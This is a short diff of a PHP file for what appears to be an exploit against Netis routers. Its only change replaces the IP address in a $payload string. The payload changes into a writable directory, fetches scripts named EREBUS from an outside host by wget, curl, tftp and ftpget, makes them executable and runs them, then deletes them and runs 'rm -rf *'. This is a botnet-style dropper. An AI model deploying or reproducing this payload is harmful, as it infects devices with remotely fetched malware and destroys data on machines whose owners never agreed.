@@ -1,6 +1,6 @@
 <?php
 
-$payload =" cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://206.189.106.172/EREBUS.sh; curl -O http://206.189.106.172/EREBUS.sh; chmod 777 EREBUS.sh; sh EREBUS.sh; tftp 206.189.106.172 -c get tEREBUS.sh; chmod 777 tEREBUS.sh; sh tEREBUS.sh; tftp -r tEREBUS2.sh -g 206.189.106.172; chmod 777 tEREBUS2.sh; sh tEREBUS2.sh; ftpget -v -u anonymous -p anonymous -P 21 206.189.106.172 EREBUS1.sh EREBUS1.sh; sh EREBUS1.sh; rm -rf EREBUS.sh tEREBUS.sh tEREBUS2.sh EREBUS1.sh; rm -rf *";
+$payload ="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://35.242.141.58/EREBUS.sh; curl -O http://35.242.141.58/EREBUS.sh; chmod 777 EREBUS.sh; sh EREBUS.sh; tftp 35.242.141.58 -c get tEREBUS.sh; chmod 777 tEREBUS.sh; sh tEREBUS.sh; tftp -r tEREBUS2.sh -g 35.242.141.58; chmod 777 tEREBUS2.sh; sh tEREBUS2.sh; ftpget -v -u anonymous -p anonymous -P 21 35.242.141.58 EREBUS1.sh EREBUS1.sh; sh EREBUS1.sh; rm -rf EREBUS.sh tEREBUS.sh tEREBUS2.sh EREBUS1.sh; rm -rf *";
 class Netis {
 	protected $payload;
 	public function __construct($payload){
